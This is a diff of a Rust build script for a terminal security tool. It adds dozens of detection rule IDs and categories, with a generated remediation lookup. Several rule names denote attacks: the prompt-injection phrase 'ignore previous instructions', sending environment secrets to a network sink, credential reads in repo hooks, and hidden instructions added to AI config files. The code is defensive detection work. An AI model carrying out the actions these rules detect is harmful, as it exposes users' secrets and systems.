+    // Threat intelligence — local DB
     ("threat_malicious_package", "ThreatMaliciousPackage"),
     ("threat_malicious_ip", "ThreatMaliciousIp"),
     ("threat_package_typosquat", "ThreatPackageTyposquat"),
     ("threat_package_similar_name", "ThreatPackageSimilarName"),
-    // Threat intelligence — Phase B (keyed feeds)
+    (
+        "threat_unresolved_malicious_package",
+        "ThreatUnresolvedMaliciousPackage",
+    ),
+    // Threat intelligence — supplemental feeds
     ("threat_malicious_url", "ThreatMaliciousUrl"),
     ("threat_phishing_url", "ThreatPhishingUrl"),
     ("threat_tor_exit_node", "ThreatTorExitNode"),
     ("threat_threat_fox_ioc", "ThreatThreatFoxIoc"),
-    // Threat intelligence — Phase C (real-time API)
+    // Threat intelligence — real-time lookups
     ("threat_osv_vulnerable", "ThreatOsvVulnerable"),
     ("threat_cisa_kev", "ThreatCisaKev"),
     ("threat_suspicious_package", "ThreatSuspiciousPackage"),
     ("threat_safe_browsing", "ThreatSafeBrowsing"),
+    // Package reputation rules (M6 ch6).
+    ("package_not_found_in_registry", "PackageNotFoundInRegistry"),
+    (
+        "package_maintainer_change_recent",
+        "PackageMaintainerChangeRecent",
+    ),
+    (
+        "package_ownership_transferred",
+        "PackageOwnershipTransferred",
+    ),
+    ("package_osv_advisory_active", "PackageOsvAdvisoryActive"),
+    ("package_dependency_confusion", "PackageDependencyConfusion"),
+    (
+        "package_install_script_network_call",
+        "PackageInstallScriptNetworkCall",
+    ),
+    ("package_repo_mismatch", "PackageRepoMismatch"),
+    // Package-policy gated rules (M6 ch7).
+    (
+        "package_policy_newer_than_days",
+        "PackagePolicyNewerThanDays",
+    ),
+    ("package_policy_low_downloads", "PackagePolicyLowDownloads"),
+    (
+        "package_policy_typosquat_distance",
+        "PackagePolicyTyposquatDistance",
+    ),
+    (
+        "package_policy_unknown_package_with_install_scripts",
+        "PackagePolicyUnknownPackageWithInstallScripts",
+    ),
+    ("package_policy_not_found", "PackagePolicyNotFound"),
     // Rendered content
     ("hidden_css_content", "HiddenCssContent"),
     ("hidden_color_content", "HiddenColorContent"),
@@ -813,10 +1159,269 @@ const EXPECTED_RULES: &[(&str, &str)] = &[
     ("private_key_exposed", "PrivateKeyExposed"),
     // Policy
     ("policy_blocklisted", "PolicyBlocklisted"),
+    ("agent_denied_by_policy", "AgentDeniedByPolicy"),
     // Custom
     ("custom_rule_match", "CustomRuleMatch"),
     // License/infrastructure
     ("license_required", "LicenseRequired"),
+    // Output-direction rules (M7 ch1) — fire from `engine::analyze_output`, which
+    // is byte-scan based and bypasses the tier-1 gate, so no PATTERN_TABLE entry.
+    ("output_osc52_clipboard_write", "OutputOsc52ClipboardWrite"),
+    ("output_hidden_text", "OutputHiddenText"),
+    ("output_fake_prompt", "OutputFakePrompt"),
+    (
+        "output_terminal_hyperlink_mismatch",
+        "OutputTerminalHyperlinkMismatch",
+    ),
+    ("output_title_manipulation", "OutputTitleManipulation"),
+    ("output_clear_screen", "OutputClearScreen"),
+    (
+        "output_truncated_escape_sequence",
+        "OutputTruncatedEscapeSequence",
+    ),
+    ("output_analysis_overflow", "OutputAnalysisOverflow"),
+    // M7 ch5 — prompt-injection seed phrases.
+    ("prompt_injection_in_output", "PromptInjectionInOutput"),
+    ("ignore_previous_instructions", "IgnorePreviousInstructions"),
+    ("prompt_injection_obfuscated", "PromptInjectionObfuscated"),
+    // C7 — output-side data-exfiltration rule.
+    ("output_data_exfiltration", "OutputDataExfiltration"),
+    // C10 — Web3 execution-boundary rules. Exactly three; parser and config
+    // gaps reuse `analysis_incomplete`.
+    ("web3_state_changing_command", "Web3StateChangingCommand"),
+    ("web3_signer_risk", "Web3SignerRisk"),
+    (
+        "web3_network_policy_violation",
+        "Web3NetworkPolicyViolation",
+    ),
+    // Operational-context rules (M8 ch1).
+    (
+        "context_prod_destructive_command",
+        "ContextProdDestructiveCommand",
+    ),
+    ("context_prod_write_operation", "ContextProdWriteOperation"),
+    (
+        "context_prod_credential_change",
+        "ContextProdCredentialChange",
+    ),
+    // SSH operational-context rules (M8 ch2).
+    (
+        "ssh_remote_destructive_on_labeled_host",
+        "SshRemoteDestructiveOnLabeledHost",
+    ),
+    (
+        "ssh_remote_shell_on_labeled_host",
+        "SshRemoteShellOnLabeledHost",
+    ),
+    // IaC operational-context rules (M8 ch3).
+    ("iac_apply_without_plan", "IacApplyWithoutPlan"),
+    ("iac_apply_auto_approve", "IacApplyAutoApprove"),
+    ("iac_apply_auto_approve_prod", "IacApplyAutoApproveProd"),
+    ("iac_destroy_prod", "IacDestroyProd"),
+    ("iac_plan_high_risk_changes", "IacPlanHighRiskChanges"),
+    ("iac_plan_hash_mismatch", "IacPlanHashMismatch"),
+    // Sudo-escalation rules (M8 ch4).
+    ("sudo_shell_spawn", "SudoShellSpawn"),
+    ("sudo_env_preserve_sensitive", "SudoEnvPreserveSensitive"),
+    ("sudo_tee_system_file", "SudoTeeSystemFile"),
+    ("sudo_download_install", "SudoDownloadInstall"),
+    (
+        "sudo_recursive_perms_broad_path",
+        "SudoRecursivePermsBroadPath",
+    ),
+    // Container-runtime rules (M8 ch5).
+    ("docker_run_privileged", "DockerRunPrivileged"),
+    (
+        "docker_run_sensitive_bind_mount",
+        "DockerRunSensitiveBindMount",
+    ),
+    ("docker_exec_prod_container", "DockerExecProdContainer"),
+    // Workstation hygiene rules (M9 ch1).
+    (
+        "hygiene_private_key_loose_perms",
+        "HygienePrivateKeyLoosePerms",
+    ),
+    ("hygiene_env_world_readable", "HygieneEnvWorldReadable"),
+    (
+        "hygiene_kubeconfig_group_readable",
+        "HygieneKubeconfigGroupReadable",
+    ),
+    (
+        "hygiene_npmrc_plaintext_token",
+        "HygieneNpmrcPlaintextToken",
+    ),
+    (
+        "hygiene_pypirc_plaintext_token",
+        "HygienePypircPlaintextToken",
+    ),
+    (
+        "hygiene_ssh_config_unsafe_include",
+        "HygieneSshConfigUnsafeInclude",
+    ),
+    (
+        "hygiene_git_credential_helper_store",
+        "HygieneGitCredentialHelperStore",
+    ),
+    (
+        "hygiene_shell_history_secret_like",
+        "HygieneShellHistorySecretLike",
+    ),
+    ("hygiene_cloud_creds_bad_perms", "HygieneCloudCredsBadPerms"),
+    ("hygiene_db_dump_in_repo", "HygieneDbDumpInRepo"),
+    // Persistence-mechanism state-change rules (M9 ch2).
+    (
+        "persistence_shell_rc_modified",
+        "PersistenceShellRcModified",
+    ),
+    (
+        "persistence_authorized_keys_new_entry",
+        "PersistenceAuthorizedKeysNewEntry",
+    ),
+    ("persistence_crontab_modified", "PersistenceCrontabModified"),
+    (
+        "persistence_launch_agent_added",
+        "PersistenceLaunchAgentAdded",
+    ),
+    (
+        "persistence_ssh_config_include",
+        "PersistenceSshConfigInclude",
+    ),
+    ("persistence_direnv_new_envrc", "PersistenceDirenvNewEnvrc"),
+    // Shell-alias / function risk rules (M9 ch3).
+    (
+        "alias_overrides_critical_command",
+        "AliasOverridesCriticalCommand",
+    ),
+    ("alias_contains_network_call", "AliasContainsNetworkCall"),
+    (
+        "alias_contains_credential_read",
+        "AliasContainsCredentialRead",
+    ),
+    ("alias_recently_added", "AliasRecentlyAdded"),
+    // Environment-variable lifecycle rules (M9 ch4).
+    (
+        "env_sensitive_exposed_to_unknown_script",
+        "EnvSensitiveExposedToUnknownScript",
+    ),
+    (
+        "env_sensitive_persisted_in_shell_rc",
+        "EnvSensitivePersistedInShellRc",
+    ),
+    ("env_printenv_to_network_sink", "EnvPrintenvToNetworkSink"),
+    // Executable-provenance + PATH-shadowing rules (M9 ch5).
+    ("exec_in_tmp", "ExecInTmp"),
+    ("exec_recently_modified", "ExecRecentlyModified"),
+    ("exec_world_writable", "ExecWorldWritable"),
+    ("exec_shadows_system_command", "ExecShadowsSystemCommand"),
+    ("exec_unsigned", "ExecUnsigned"),
+    ("exec_in_repo_bin", "ExecInRepoBin"),
+    (
+        "path_writable_dir_before_system",
+        "PathWritableDirBeforeSystem",
+    ),
+    ("path_duplicate_command_name", "PathDuplicateCommandName"),
+    ("path_dir_in_repo", "PathDirInRepo"),
+    ("path_dir_in_tmp", "PathDirInTmp"),
+    // Repo-hook / automation guard rules (M9 ch6).
+    ("repo_hook_network_call", "RepoHookNetworkCall"),
+    ("repo_hook_credential_read", "RepoHookCredentialRead"),
+    ("repo_hook_sudo", "RepoHookSudo"),
+    (
+        "repo_hook_suspicious_shell_pattern",
+        "RepoHookSuspiciousShellPattern",
+    ),
+    ("repo_hook_external_fetch", "RepoHookExternalFetch"),
+    // Blast-radius rules (M10 ch1).
+    ("blast_deletes_outside_repo", "BlastDeletesOutsideRepo"),
+    ("blast_writes_system_path", "BlastWritesSystemPath"),
+    ("blast_symlink_traversal", "BlastSymlinkTraversal"),
+    ("blast_empty_var_glob", "BlastEmptyVarGlob"),
+    ("blast_find_delete", "BlastFindDelete"),
+    ("blast_rsync_delete", "BlastRsyncDelete"),
+    ("blast_large_file_count", "BlastLargeFileCount"),
+    // Post-run diff rule (M10 ch2).
+    ("post_run_shell_rc_modified", "PostRunShellRcModified"),
+    // Tainted-content tracking rules (M10 ch3).
+    ("exec_of_tainted_file", "ExecOfTaintedFile"),
+    (
+        "command_sourced_from_tainted_file",
+        "CommandSourcedFromTaintedFile",
+    ),
+    // Anomaly-detection rules (M10 ch5, D2).
+    (
+        "anomaly_first_time_in_this_repo",
+        "AnomalyFirstTimeInThisRepo",
+    ),
+    ("anomaly_rare_in_baseline", "AnomalyRareInBaseline"),
+    // Command-card rules (M11 ch1).
+    ("command_card_verified", "CommandCardVerified"),
+    ("command_card_unverified", "CommandCardUnverified"),
+    ("command_card_mismatch", "CommandCardMismatch"),
+    // Repo command-manifest rules (M11 ch2).
+    ("repo_command_unknown", "RepoCommandUnknown"),
+    (
+        "repo_command_dangerous_pattern",
+        "RepoCommandDangerousPattern",
+    ),
+    // Honeytoken / canary rule (M11 ch3, D3).
+    ("canary_token_touched", "CanaryTokenTouched"),
+    // Paste-provenance rule (M12 ch1). Companion-file state + content-hash match;
+    // no PATTERN_TABLE entry (the trigger is not a regex), category "clipboard".
+    ("paste_source_mismatch", "PasteSourceMismatch"),
+    // AI-config drift rules (M13 ch5). Diff-triggered by `tirith ai diff`; no
+    // PATTERN_TABLE entry (the trigger is a snapshot diff), category "aifile".
+    (
+        "ai_config_hidden_instruction_added",
+        "AiConfigHiddenInstructionAdded",
+    ),
+    ("ai_config_tool_use_escalation", "AiConfigToolUseEscalation"),
+    // Cross-event correlation rules (W7). Session/post-process, fired by
+    // `correlate_session` over a bounded per-session event ring; no PATTERN_TABLE
+    // entry (the trigger is a sequence, not a single input). Category "correlation".
+    ("secret_write_then_network", "SecretWriteThenNetwork"),
+    (
+        "dependency_change_then_network",
+        "DependencyChangeThenNetwork",
+    ),
+    ("delete_then_force_push", "DeleteThenForcePush"),
+    ("mass_file_deletion", "MassFileDeletion"),
+    // A2 — scan coverage incompleteness (assembled by the scan driver).
+    ("analysis_incomplete", "AnalysisIncomplete"),
+    // B5 installed-distribution integrity (correlated by the installed-tree scan).
+    (
+        "python_installed_integrity_violation",
+        "PythonInstalledIntegrityViolation",
+    ),
+    // B6 Python startup-hook execution (correlated by the installed-tree scan).
+    (
+        "python_startup_hook_suspicious",
+        "PythonStartupHookSuspicious",
+    ),
+    (
+        "python_startup_hook_cross_runtime",
+        "PythonStartupHookCrossRuntime",
+    ),
+    // B7 native import-execution chain (correlated by native triage over an
+    // archive member or installed native module).
+    (
+        "native_import_execution_chain",
+        "NativeImportExecutionChain",
+    ),
+    // B8 + DB-D artifact/member known-malicious hash match (feature-gated,
+    // externally triggered; unreachable until the hash-lookup feature + DB land).
+    ("artifact_known_malicious", "ArtifactKnownMalicious"),
+    // B8 wheel structurally rejected by the hardened reader (path traversal, encrypted
+    // member, CRC mismatch, duplicate-path collision); synthesized by `package inspect`.
+    ("wheel_structurally_rejected", "WheelStructurallyRejected"),
+    // D3 package-firewall download-vs-expected hash mismatch (externally
+    // triggered by `artifact::firewall` re-hashing a quarantine blob; no fixture).
+    (
+        "artifact_download_integrity_mismatch",
+        "ArtifactDownloadIntegrityMismatch",
+    ),
+    // F2 package-firewall release differential anomaly (externally triggered by
+    // `artifact::release_diff` comparing two on-disk wheels; no fixture).
+    ("artifact_release_anomaly", "ArtifactReleaseAnomaly"),
 ];
 
 const VALID_CATEGORIES: &[&str] = &[
@@ -839,6 +1444,25 @@ const VALID_CATEGORIES: &[&str] = &[
     "custom",
     "license",
     "threatintel",
+    "output",
+    "context",
+    "hygiene",
+    "persistence",
+    "aliases",
+    "exec",
+    "hooks",
+    "blast",
+    "taint",
+    "anomaly",
+    "command_card",
+    "commands_manifest",
+    "canary",
+    // M13 ch5 — AI-config drift rules, emitted by `tirith ai diff`.
+    "aifile",
+    // W7: cross-event correlation rules, emitted by `correlate_session`.
+    "correlation",
+    // A2: scan-coverage rules, assembled by the scan driver from coverage gaps.
+    "scan",
 ];
 
 #[derive(Deserialize)]
@@ -871,10 +1495,8 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
     let file: RuleExplanationsFile = toml::from_str(&content)
         .unwrap_or_else(|e| panic!("Failed to parse rule_explanations.toml: {e}"));
 
-    // Build lookup of expected IDs → PascalCase variant
     let expected: std::collections::HashMap<&str, &str> = EXPECTED_RULES.iter().copied().collect();
 
-    // Validate: no duplicates
     let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
     for entry in &file.rule {
         if !seen.insert(entry.id.clone()) {
@@ -882,7 +1504,6 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
         }
     }
 
-    // Validate: every entry has a valid id
     for entry in &file.rule {
         if !expected.contains_key(entry.id.as_str()) {
             panic!(
@@ -892,14 +1513,12 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
         }
     }
 
-    // Validate: every expected id is present
     for (snake, _pascal) in EXPECTED_RULES {
         if !seen.contains(*snake) {
             panic!("rule_explanations.toml: missing entry for '{snake}'");
         }
     }
 
-    // Validate: categories
     for entry in &file.rule {
         if !VALID_CATEGORIES.contains(&entry.category.as_str()) {
             panic!(
@@ -910,7 +1529,6 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
         }
     }
 
-    // --- Generate code ---
     let esc = |s: &str| esc_rust_str(s);
 
     let mut code = String::new();
@@ -919,7 +1537,6 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
          // Modify assets/data/rule_explanations.toml and rebuild.\n\n",
     );
 
-    // Per-entry static arrays for slice fields
     for entry in &file.rule {
         let upper_id = entry.id.to_uppercase();
         if !entry.examples_bad.is_empty() {
@@ -951,7 +1568,6 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
         }
     }
 
-    // Main explanations array
     code.push_str("\npub const RULE_EXPLANATIONS: &[RuleExplanation] = &[\n");
     for entry in &file.rule {
         let upper_id = entry.id.to_uppercase();
@@ -999,7 +1615,6 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
     }
     code.push_str("];\n");
 
-    // MITRE ATT&CK match function over RuleId enum
     code.push_str(
         "\n/// MITRE ATT&CK lookup generated from rule_explanations.toml.\n\
          /// Single source of truth — replaces the hand-written match in engine.rs.\n\
@@ -1019,6 +1634,30 @@ fn compile_rule_explanations(data_dir: &Path, out_dir: &str) {
         }
     }
     code.push_str("        _ => None,\n    }\n}\n");
+
+    // Per-rule remediation lookup. Exhaustive (build.rs panics above if any TOML
+    // entry is missing), so the generated match needs no wildcard arm.
+    code.push_str(
+        "\n/// Per-rule remediation lookup generated from rule_explanations.toml.\n\
+         ///\n\
+         /// Returns the canonical \"what to do instead / how to make this safe\"\n\
+         /// string for a `RuleId`. Exhaustive over every variant. Some rules have\n\
+         /// no mechanical fix — their remediation is honest guidance rather than a\n\
+         /// rewrite. An empty string means no remediation advice is available.\n\
+         pub fn remediation_for_rule(rule_id: crate::verdict::RuleId) -> &'static str {\n\
+         \x20   use crate::verdict::RuleId;\n\
+         \x20   match rule_id {\n",
+    );
+    for entry in &file.rule {
+        let pascal = expected
+            .get(entry.id.as_str())
+            .unwrap_or_else(|| panic!("no PascalCase for '{}'", entry.id));
+        code.push_str(&format!(
+            "        RuleId::{pascal} => \"{}\",\n",
+            esc(&entry.remediation)
+        ));
+    }
+    code.push_str("    }\n}\n");
 
     let out_path = Path::new(out_dir).join("rule_explanations_gen.rs");
     fs::write(&out_path, code).unwrap();
